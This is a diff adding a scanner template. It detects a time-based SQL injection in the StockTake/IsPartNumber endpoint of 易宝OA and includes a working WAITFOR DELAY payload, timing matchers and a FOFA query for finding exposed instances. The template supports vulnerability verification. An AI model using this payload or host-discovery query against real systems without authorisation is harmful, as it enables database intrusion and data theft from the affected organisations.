@@ -1,0 +1,24 @@
+## id: VEID-2026-11116
+## name: 易宝OA StockTakeIsPartNumberSQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 易宝OA StockTake/IsPartNumber存在SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 易宝OA
+## fofa-query: (title="欢迎登录易宝OA系统" && body="/Content/css/OAstyle.css") || body="$.cookie("topvision_oaName"
+## verification: true
+
+
+
+GET /SmartTradeScan/StockTake/IsPartNumber?pn=1%27WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 6 && response_time < 8
+#@ matcher: header["Content-Type"] contains "json"
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: bd87f00c852b6b5c43b1903a6f557c3415b69afd159e7ea00355915c1375a699
